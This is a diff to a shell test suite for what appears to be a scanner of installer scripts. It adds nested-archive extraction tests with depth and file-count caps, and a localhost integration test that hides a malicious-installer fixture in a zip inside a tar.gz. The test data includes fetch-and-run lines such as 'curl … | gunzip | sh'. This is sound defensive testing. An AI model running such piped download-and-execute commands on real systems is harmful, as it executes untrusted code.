@@ -467,6 +467,42 @@ PYX
   [[ -f "$xt/out_t.tgz/pkg/run.sh" && ! -L "$xt/out_t.tgz/pkg/link" ]] && pass "tar member extracted, symlink skipped" || fail "tar extract/symlink"
   eq "lone .gz detected"             "$(xk run.sh.gz run.sh)" "gz"
   [[ -f "$xt/out_run.sh.gz/run.sh" ]] && pass "lone .gz written under --name" || fail "lone .gz output"
+  # nested: zip -> tar.gz -> run.sh.gz -> run.sh, each layer beside its archive
+  python3 - "$xt" <<'PYN'
+import gzip, io, sys, tarfile, zipfile
+d = sys.argv[1]
+def tgz(members):
+    b = io.BytesIO()
+    with tarfile.open(fileobj=b, mode="w:gz") as t:
+        for n, data in members:
+            ti = tarfile.TarInfo(n); ti.size = len(data); t.addfile(ti, io.BytesIO(data))
+    return b.getvalue()
+def zipb(members):
+    b = io.BytesIO()
+    with zipfile.ZipFile(b, "w") as z:
+        for n, data in members: z.writestr(n, data)
+    return b.getvalue()
+open(f"{d}/nest.zip", "wb").write(zipb([("inner.tgz", tgz([("run.sh.gz", gzip.compress(b"echo deep\n"))]))]))
+# five zips deep: only NESTED_MAX_DEPTH (3) layers below the outer one open
+z = zipb([("bottom.sh", b"echo bottom\n")])
+for i in range(4, -1, -1):
+    z = zipb([(f"l{i}.zip", z)])
+open(f"{d}/deep.zip", "wb").write(z)
+# shared budget: 3 inner zips of 2000 files each > EXTRACT_MAX_FILES (4000)
+many = zipb([(f"f{i}.txt", b"x") for i in range(2000)])
+open(f"{d}/wide.zip", "wb").write(zipb([(f"w{i}.zip", many) for i in range(3)]))
+PYN
+  eq "nested: outer kind reported"   "$(xk nest.zip)" "zip"
+  [[ -f "$xt/out_nest.zip/inner.tgz_unpacked/run.sh.gz_unpacked/run.sh" ]] \
+    && pass "nested zip -> tar.gz -> .gz all unpacked" || fail "nested unpack: $(find "$xt/out_nest.zip" | tr '\n' ' ')"
+  [[ -f "$xt/out_nest.zip/inner.tgz" ]] && pass "nested archive kept for hash check" || fail "nested archive removed"
+  xk deep.zip >/dev/null
+  [[ -d "$xt/out_deep.zip/l0.zip_unpacked/l1.zip_unpacked/l2.zip_unpacked" ]] && pass "nested: 3 layers below the outer one opened" || fail "nested depth too shallow"
+  [[ ! -e "$xt/out_deep.zip/l0.zip_unpacked/l1.zip_unpacked/l2.zip_unpacked/l3.zip_unpacked" ]] && pass "nested: depth capped" || fail "nested depth not capped"
+  xk wide.zip >/dev/null
+  wn="$(find "$xt/out_wide.zip" -type f -name 'f*.txt' | wc -l | tr -d ' ')"
+  (( wn <= 4000 )) && pass "nested: file cap shared across layers ($wn files)" || fail "nested budget not shared ($wn files)"
+
   eq "non-archive -> nothing"        "$(xk plain.txt)" ""
   [[ ! -e "$xt/out_plain.txt" ]] && pass "non-archive leaves no dest dir" || fail "non-archive created dest"
   rm -rf "$xt"
@@ -474,7 +510,7 @@ else
   echo "  (python3 unavailable — skipping --extract test)"
 fi
 
-echo "integration: staged archives (installer pulls a zip / tar.gz / .gz by scheme-less URL)"
+echo "integration: staged archives (installer pulls a zip / tar.gz / .gz / nested by scheme-less URL)"
 if command -v curl >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
   sd=$(mktemp -d); ssrv=$(mktemp)
   # the payload is the inert malicious installer fixture, wrapped three ways;
@@ -489,6 +525,11 @@ with tarfile.open(f"{d}/payload.tgz", "w:gz") as t:
     ti = tarfile.TarInfo("bin/run.sh"); ti.size = len(bad); t.addfile(ti, io.BytesIO(bad))
 open(f"{d}/run.sh.gz", "wb").write(gzip.compress(bad))
 open(f"{d}/download", "wb").write(open(f"{d}/payload.zip", "rb").read())
+# nested: a zip holding a tar.gz holding the gzipped payload
+b = io.BytesIO()
+with tarfile.open(fileobj=b, mode="w:gz") as t:
+    g = gzip.compress(bad); ti = tarfile.TarInfo("run.sh.gz"); ti.size = len(g); t.addfile(ti, io.BytesIO(g))
+with zipfile.ZipFile(f"{d}/nested.zip", "w") as z: z.writestr("inner.tgz", b.getvalue())
 PYS
   python3 -c '
 import http.server, socketserver, sys, os
@@ -505,7 +546,8 @@ with socketserver.TCPServer(("127.0.0.1", 0), http.server.SimpleHTTPRequestHandl
     printf '#!/bin/sh\ncurl -fsSL 127.0.0.1:%s/run.sh.gz | gunzip | sh\n' "$SPORT" > "$sd/i_gz.sh"
     printf '#!/bin/sh\nwget -qO /tmp/x "127.0.0.1:%s/download?id=7"\n' "$SPORT" > "$sd/i_noext.sh"
     printf '#!/bin/sh\ncurl -fsSLO 127.0.0.1:%s/ok.zip && unzip ok.zip\n' "$SPORT" > "$sd/i_ok.sh"
-    for k in zip tgz gz noext; do
+    printf '#!/bin/sh\ncurl -fsSLO 127.0.0.1:%s/nested.zip && unzip nested.zip\n' "$SPORT" > "$sd/i_nested.sh"
+    for k in zip tgz gz noext nested; do
       sj="$("$SC" --no-llm --json "curl -fsSL 127.0.0.1:$SPORT/i_$k.sh | sh" 2>/dev/null)"
       sv="$(printf '%s' "$sj" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d["verdict"], any("_unpacked/" in f["file"] and f["tag"]=="ioc-str" for f in d["findings"]))' 2>/dev/null)"
       eq "staged $k payload caught inside the unpacked archive" "$sv" "DANGEROUS True"
